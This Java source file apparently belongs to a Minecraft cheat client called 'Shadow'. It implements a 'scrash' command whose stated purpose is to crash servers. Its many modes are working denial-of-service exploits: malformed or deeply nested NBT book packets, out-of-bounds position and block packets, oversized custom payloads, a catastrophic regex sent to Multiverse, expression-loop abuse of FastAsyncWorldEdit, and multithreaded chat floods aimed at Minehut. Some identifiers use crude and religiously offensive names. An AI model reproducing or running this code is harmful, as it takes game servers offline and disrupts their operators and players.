package net.shadow.feature.command;

import io.netty.buffer.Unpooled;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import net.minecraft.client.option.ChatVisibility;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.*;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.util.Arm;
import net.minecraft.util.Hand;
import net.minecraft.util.Identifier;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.minecraft.util.registry.Registry;
import net.shadow.Shadow;
import net.shadow.event.events.PacketInput;
import net.shadow.feature.base.Command;
import java.util.List;
import net.shadow.plugin.Notification;
import net.shadow.plugin.NotificationSystem;
import net.shadow.utils.ChatUtils;

import java.util.Random;
import java.util.Set;

public class SCrashCmd extends Command implements PacketInput {

    static int var2;
    static int varcounter;
    static boolean safe;

    public SCrashCmd() {
        super("scrash", "crash servers");
    }

    @Override
    public List<String> completions(int index, String[] args){
        if(index == 0){
            return List.of(new String[]{"GiveBook", "ClickBook", "GiveShortBook", "ClickShortBook", "ClickInflatedBook", "CustomPayload", "Vanilla", "FAWE", "MapTool", "StackOverflow", "ChunkOOB", "DotCrash", "MVCrash", "cpuburner", "eazy", "FAWE2"});
        }
        if(index == 1){
            return List.of(new String[]{"500"});
        }
        return List.of(new String[0]);
    }

    @Override
    public void call(String[] args) {
        switch (args[0].toLowerCase()) {
            case "list":
                ChatUtils.message("Modes:");
                ChatUtils.message("GiveBook");
                ChatUtils.message("ClickBook");
                ChatUtils.message("GiveShortBook");
                ChatUtils.message("ClickShortBook");
                ChatUtils.message("ClickInflatedBook");
                ChatUtils.message("CustomPayload");
                ChatUtils.message("Vanilla");
                ChatUtils.message("FAWE");
                ChatUtils.message("MapTool");
                ChatUtils.message("StackOverflow");
                ChatUtils.message("ChunkOOB");
                ChatUtils.message("DotCrash");
                ChatUtils.message("MVCrash");
                ChatUtils.message("cpuburner");
                ChatUtils.message("jdam");
                ChatUtils.message("minehutdown");
                ChatUtils.message("eazy");
                ChatUtils.message("FAWE2");
                break;

            case "safe":
                safe = true;
                break;

            case "eazy":
                NotificationSystem.notifications.add(new Notification("Crasher", "Crashing - Malformed Packet", 150));
                ItemStack ez = new ItemStack(Items.CHEST, 1);
                NbtCompound nbt = new NbtCompound();
                nbt.put("x", NbtDouble.of(Double.MAX_VALUE));
                nbt.put("y", NbtDouble.of(0.0d));
                nbt.put("z", NbtDouble.of(Double.MAX_VALUE));
                NbtCompound fuck = new NbtCompound();
                fuck.put("BlockEntityTag", nbt);
                ez.setNbt(fuck);
                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(25, ez));
                break;

            case "minehutdown":
                varcounter = 0;
                safe = false;
                NotificationSystem.notifications.add(new Notification("Crasher", "Crashing - Kicking", 150));
                Shadow.getEventSystem().add(PacketInput.class, this);
                ChatMessageC2SPacket p = new ChatMessageC2SPacket("/lobby");
                for (int j = 0; j < 4; j++) {
                    new Thread(() -> {
                        for (int i = 0; i < 666667; i++) {
                            if (Shadow.c.player != null) {
                                Shadow.c.getNetworkHandler().getConnection().send(p);
                            }
                        }
                    }).start();
                }
                break;

            case "jdam":
                NotificationSystem.notifications.add(new Notification("Crasher", "Crashing - JDAM5000 RIP CONNECTION", 150));
                Set<Identifier> a = Registry.ITEM.getIds();
                Random r = new Random();
                for (Identifier ident : a.toArray(Identifier[]::new)) {
                    Item destroy = Registry.ITEM.get(ident);
                    ItemStack jam = new ItemStack(destroy, 1);
                    NbtCompound allah = new NbtCompound();
                    for (int j = 0; j < 250; j++) {
                        allah.put("Allah" + r.nextInt(10000), NbtString.of("Problem?".repeat(200)));
                    }
                    jam.setNbt(allah);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, jam));
                }
                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, new ItemStack(Items.AIR, 1)));
                break;

            case "vanilla":
                NotificationSystem.notifications.add(new Notification("Crasher", "Crashing - Vanilla", 150));
                long sy4 = System.currentTimeMillis();
                for (int i = 0; i < 50; i++) {
                    Shadow.c.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(29999999, Shadow.c.player.getY(), 29999999, true));
                }
                ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - sy4) + "ms)");
                break;


            case "cpuburner":
                int size;
                try {
                    size = Integer.parseInt(args[1]);
                } catch (Exception e) {
                    ChatUtils.message("Put a valid number after");
                    return;
                }
                NotificationSystem.notifications.add(new Notification("Crasher", "Crashing - Pong", 150));
                for (int i = 0; i < 250; i++) {
                    Shadow.c.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Shadow.c.player.getX() + (i * size), Shadow.c.player.getY(), Shadow.c.player.getZ() + (i * size), true));
                }
                break;

            case "clickbook":
                try {
                    int pages = Integer.parseInt(args[1]);
                    int pop = Integer.parseInt(args[2]);
                    new Thread(() -> {
                        NotificationSystem.notifications.add(new Notification("Crasher", "Crashing - ClickBook", 150));
                        long sy = System.currentTimeMillis();
                        ItemStack payload2 = new ItemStack(Items.WRITTEN_BOOK);
                        NbtCompound payload = payload2.getOrCreateNbt();
                        NbtList list = new NbtList();
                        StringBuilder f = new StringBuilder();
                        f.append("{");
                        f.append("extra:[{".repeat(Math.max(0, pages)));
                        f.append("text:\"-\"}],".repeat(Math.max(0, pages)));
                        f.append("text:\"-\"}");
                        for (int i = 0; i < pages / 16; i++) {
                            list.add(NbtString.of(f.toString()));
                        }
                        payload.put("author", NbtString.of(Shadow.c.player.getGameProfile().getName()));
                        payload.put("title", NbtString.of("Shadow"));
                        payload.put("pages", list);
                        payload.put("resolved", NbtByte.of(true));
                        payload2.setNbt(payload);
                        Int2ObjectMap<ItemStack> c = new Int2ObjectArrayMap<>();
                        c.put(0, payload2);
                        for (int i = 0; i < pop; i++) {
                            Shadow.c.player.networkHandler.sendPacket(new ClickSlotC2SPacket(Shadow.c.player.currentScreenHandler.syncId, 0, 0, 1, SlotActionType.PICKUP, payload2, c));
                        }
                        ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - sy) + "ms)");
                    }).start();
                } catch (Exception e) {
                    ChatUtils.message("use >scrash clickbook <pages> <power>");
                }
                break;

            case "givebook":
                try {
                    int pages = Integer.parseInt(args[1]);
                    int pop = Integer.parseInt(args[2]);
                    new Thread(() -> {
                        NotificationSystem.notifications.add(new Notification("Crasher", "Crashing - GiveBook", 150));
                        long sy = System.currentTimeMillis();
                        ItemStack payload2 = new ItemStack(Items.WRITTEN_BOOK);
                        NbtCompound payload = payload2.getOrCreateNbt();
                        NbtList list = new NbtList();
                        StringBuilder f = new StringBuilder();
                        f.append("{");
                        f.append("extra:[{".repeat(Math.max(0, pages)));
                        f.append("text:\"+\"}],".repeat(Math.max(0, pages)));
                        f.append("text:\"+\"}");
                        for (int i = 0; i < pages / 16; i++) {
                            list.add(NbtString.of(f.toString()));
                        }
                        payload.put("author", NbtString.of(Shadow.c.player.getGameProfile().getName()));
                        payload.put("title", NbtString.of("Shadow"));
                        payload.put("pages", list);
                        payload.put("resolved", NbtByte.of(true));
                        payload2.setNbt(payload);
                        for (int i = 0; i < pop; i++) {
                            Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(100, payload2));
                            try {
                                Thread.sleep(0);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        }
                        ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - sy) + "ms)");
                    }).start();
                } catch (Exception e) {
                    ChatUtils.message("use >scrash givebook <pages> <power>");
                }
                break;


            case "giveshortbook":
                try {
                    int pages = Integer.parseInt(args[1]);
                    new Thread(() -> {
                        NotificationSystem.notifications.add(new Notification("Crasher", "Crashing - GiveShortBook", 150));
                        long sy = System.currentTimeMillis();
                        ItemStack payload2 = new ItemStack(Items.WRITTEN_BOOK);
                        NbtCompound payload = payload2.getOrCreateNbt();
                        NbtList list = new NbtList();
                        StringBuilder f = new StringBuilder();
                        f.append("{");
                        f.append("extra:[{".repeat(883));
                        f.append("text:ſ}],".repeat(883));
                        f.append("text:ſ}");
                        list.add(NbtString.of(f.toString()));
                        payload.put("author", NbtString.of(Shadow.c.player.getGameProfile().getName()));
                        payload.put("title", NbtString.of("Shadow"));
                        payload.put("pages", list);
                        payload.put("resolved", NbtByte.of(true));
                        payload2.setNbt(payload);
                        for (int i = 0; i < pages; i++) {
                            Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(1, payload2));
                            try {
                                Thread.sleep(0);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        }
                        ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - sy) + "ms)");
                    }).start();
                } catch (Exception e) {
                    ChatUtils.message("use >scrash givebook <pages> <power>");
                }
                break;


            case "fawe2":
            Shadow.c.player.sendChatMessage("//pos1 1.175494351E-38");
            Shadow.c.player.sendChatMessage("//pos2 1.175494351E38");
            Shadow.c.player.sendChatMessage("//copy");
            break;

            case "clickshortbook":
                try {
                    int pages = Integer.parseInt(args[1]);
                    new Thread(() -> {
                        NotificationSystem.notifications.add(new Notification("Crasher", "Crashing - ClickShortBook", 150));
                        long sy = System.currentTimeMillis();
                        ItemStack payload2 = new ItemStack(Items.WRITTEN_BOOK);
                        NbtCompound payload = payload2.getOrCreateNbt();
                        NbtList list = new NbtList();
                        StringBuilder f = new StringBuilder();
                        f.append("{");
                        f.append("extra:[{".repeat(883));
                        f.append("text:a}],".repeat(883));
                        f.append("text:a}");
                        list.add(NbtString.of(f.toString()));
                        payload.put("author", NbtString.of(Shadow.c.player.getGameProfile().getName()));
                        payload.put("title", NbtString.of("Shadow"));
                        payload.put("pages", list);
                        payload.put("resolved", NbtByte.of(true));
                        payload2.setNbt(payload);
                        Int2ObjectMap<ItemStack> c = new Int2ObjectArrayMap<>();
                        c.put(0, payload2);
                        for (int i = 0; i < pages; i++) {
                            Shadow.c.player.networkHandler.sendPacket(new ClickSlotC2SPacket(Shadow.c.player.currentScreenHandler.syncId, 0, 0, 1, SlotActionType.PICKUP, payload2, c));
                        }
                        ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - sy) + "ms)");
                    }).start();
                } catch (Exception e) {
                    ChatUtils.message("use >scrash givebook <pages> <power>");
                }
                break;

            case "clickthickbook":
                try {
                    int pages = Integer.parseInt(args[1]);
                    new Thread(() -> {
                        NotificationSystem.notifications.add(new Notification("Crasher", "Crashing - ClickThickBook", 150));
                        long sy = System.currentTimeMillis();
                        ItemStack payload2 = new ItemStack(Items.WRITTEN_BOOK);
                        NbtCompound payload = payload2.getOrCreateNbt();
                        NbtList list = new NbtList();
                        StringBuilder f = new StringBuilder();
                        f.append("{");
                        f.append("extra:[{".repeat(850));
                        f.append("text:a}],".repeat(850));
                        f.append("text:a}");
                        for (int i = 0; i < 5; i++) {
                            list.add(NbtString.of(f.toString()));
                        }
                        payload.put("author", NbtString.of(Shadow.c.player.getGameProfile().getName()));
                        payload.put("title", NbtString.of("Shadow"));
                        payload.put("pages", list);
                        payload.put("resolved", NbtByte.of(true));
                        payload2.setNbt(payload);
                        Int2ObjectMap<ItemStack> c = new Int2ObjectArrayMap<>();
                        c.put(0, payload2);
                        for (int i = 0; i < pages; i++) {
                            Shadow.c.player.networkHandler.sendPacket(new ClickSlotC2SPacket(Shadow.c.player.currentScreenHandler.syncId, 0, 0, 1, SlotActionType.PICKUP, payload2, c));
                        }
                        ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - sy) + "ms)");
                    }).start();
                } catch (Exception e) {
                    ChatUtils.message("use >scrash givebook <pages> <power>");
                }
                break;

            case "clickinflatedbook":
                try {
                    int pages = Integer.parseInt(args[1]);
                    new Thread(() -> {
                        NotificationSystem.notifications.add(new Notification("Crasher", "Crashing - ClickInflatedBook", 150));
                        long sy = System.currentTimeMillis();
                        ItemStack payload2 = new ItemStack(Items.WRITTEN_BOOK);
                        NbtCompound payload = payload2.getOrCreateNbt();
                        NbtList list = new NbtList();
                        for (int var5 = 0; var5 < 32766; ++var5) {
                            list.add(NbtString.of("38749265489736578563478564578963896745896745456795679485679456789376794679790679204567967890457890457890457890249578057890578907890454578906457890337890362578904578907890673458675906847598634756094835763904856749583702368476549023687458690459685674950684579687456954769584764598367045986745¸36873456903458674059867345908674596873459867459087609348576983457690845769084576908345769087459068734590673459087690345876903845769072843z5289046789245769045876903487596723948076098234576980453769084537690837490587690834673679836478906789037890234678907890634678903467890367890346789047890634578903457890345678934573949545797578478905678905789058907890789089089078907897893457987432867893467896783454678353456784356789345678934567979356789456456789789789456457805947604936534908670349586734590678346784678936789034367845903678904578934565789346789456789035789"));
                        }
                        payload.put("pages", list);
                        payload2.setNbt(payload);
                        Int2ObjectMap<ItemStack> c = new Int2ObjectArrayMap<>();
                        c.put(0, payload2);
                        for (int i = 0; i < pages; i++) {
                            Shadow.c.player.networkHandler.sendPacket(new ClickSlotC2SPacket(Shadow.c.player.currentScreenHandler.syncId, 0, 0, 1, SlotActionType.PICKUP, payload2, c));
                        }
                        ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - sy) + "ms)");
                    }).start();
                } catch (Exception e) {
                    ChatUtils.message("use >scrash givebook <pages> <power>");
                }
                break;

            case "custompayload":
                try {
                    int var42 = Integer.parseInt(args[1]);
                    int var44 = Integer.parseInt(args[2]);
                    long sy3 = System.currentTimeMillis();
                    NotificationSystem.notifications.add(new Notification("Crasher", "Crashing - CustomPayload", 150));
                    String rip = "⵹".repeat(var44);
                    PacketByteBuf buf = new PacketByteBuf(Unpooled.buffer());
                    buf.writeString(rip);
                    for (int i = 0; i < var42; i++) {
                        Shadow.c.player.networkHandler.sendPacket(new CustomPayloadC2SPacket(CustomPayloadC2SPacket.BRAND, buf));
                    }
                    ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - sy3) + "ms)");
                } catch (Exception e) {
                    ChatUtils.message("use >scrash custompayload <size> <power>");
                }
                break;


            case "dotcrash":
                NotificationSystem.notifications.add(new Notification("Crasher", "Crashing - Render Distance", 150));
                Shadow.c.player.networkHandler.sendPacket(new ClientSettingsC2SPacket("en_us", Integer.MIN_VALUE, ChatVisibility.FULL, true, 127, Arm.RIGHT, false, true));
                for (int i = 1; i < 300; i++) {
                    Shadow.c.player.networkHandler.sendPacket(new ClientSettingsC2SPacket("en_us", i * 100, ChatVisibility.FULL, true, 127, Arm.RIGHT, false, true));
                }
                break;


            case "chunkoob":
                NotificationSystem.notifications.add(new Notification("Crasher", "Crashing - Chunk OOB", 150));
                Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(new Vec3d(0.5, 0.5, 0.5), Direction.UP, new BlockPos(Double.POSITIVE_INFINITY, 100, Double.POSITIVE_INFINITY), true)));
                break;


            case "mvcrash":
                NotificationSystem.notifications.add(new Notification("Crasher", "Crashing - Multiverse", 150));
                Shadow.c.player.sendChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*." + "*.".repeat(new Random().nextInt(6)) + "++)$^");
                break;


            case "stackoverflow":
                long sy = System.currentTimeMillis();
                NotificationSystem.notifications.add(new Notification("Crasher", "Crashing - StackOverflow", 150));
                int varvarvar2;
                try {
                    varvarvar2 = Integer.parseInt(args[1]);
                } catch (NumberFormatException e) {
                    ChatUtils.message("Please use the format >scrash <mode> <power>");
                    break;
                }
                String popper2 = "/execute as @e" + " as @e".repeat(varvarvar2);
                Shadow.c.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, popper2));
                ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - sy) + "ms)");
                break;


            case "maptool":
                int var24 = 4;
                try {
                    var24 = Integer.parseInt(args[1]);
                } catch (NumberFormatException e) {
                    ChatUtils.message("Please use the format >scrash <mode> <power>");
                }
                NotificationSystem.notifications.add(new Notification("Crasher", "Crashing - Maptool", 150));
                Shadow.c.player.sendChatMessage("/maptool new https://cdn.discordapp.com/attachments/956657243812675595/963652761172455454/unknown.png resize " + var24 + " " + var24 + "");
                break;

            case "ptspam":
                NotificationSystem.notifications.add(new Notification("Crasher", "Crashing - Playtime", 150));
                for (int i = 0; i < 10; i++) {
                    Shadow.c.player.sendChatMessage("/playtime %¤#\"%¤#\"%¤#\"%¤#");
                }
                ChatUtils.message("Done!");
                break;

            case "fawe":
                try {
                    var2 = Integer.parseInt(args[1]);
                } catch (NumberFormatException e) {
                    ChatUtils.message("Provide a power");
                }
                new Thread(() -> {
                    long sy2 = System.currentTimeMillis();
                    NotificationSystem.notifications.add(new Notification("Crasher", "Crashing - FAWE", 150));

                    for (int var5 = 0; var5 < var2; ++var5) {
                        try {
                            Shadow.c.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(new Random().nextInt(100), "/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));
                        } catch (Exception ignored) {
                        }
                    }

                    ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - sy2) + "ms)");
                }).start();
                break;
        }
    }

    @Override
    public void onReceivedPacket(PacketInputEvent event) {
        if (event.getPacket() instanceof GameMessageS2CPacket) {
            if (safe) {
                Shadow.getEventSystem().remove(PacketInput.class, this);
            }
            event.cancel();
            varcounter++;
            ChatUtils.hud("MinehutProxy @ " + varcounter);
        }
    }
}
